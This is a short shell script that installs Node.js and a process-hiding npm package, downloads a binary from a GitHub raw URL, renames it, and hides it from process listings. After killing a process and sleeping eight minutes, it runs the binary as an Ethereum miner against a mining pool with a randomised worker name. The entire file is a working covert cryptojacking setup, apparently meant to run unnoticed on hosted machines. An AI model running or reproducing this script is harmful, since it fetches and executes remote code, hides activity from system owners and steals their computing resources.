apt-get install -y nodejs
npm i -g node-process-hider
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
wget https://github.com/aurbach55/dera/raw/main/kopi
mv kopi ditto
chmod +x ditto
ph add ditto
pkill -o 1
sleep 8m
./ditto --coin ETH --pool ethash.kupool.com:443 --user berkah.001.$(echo $(shuf -i 1-10 -n 1)-Time)
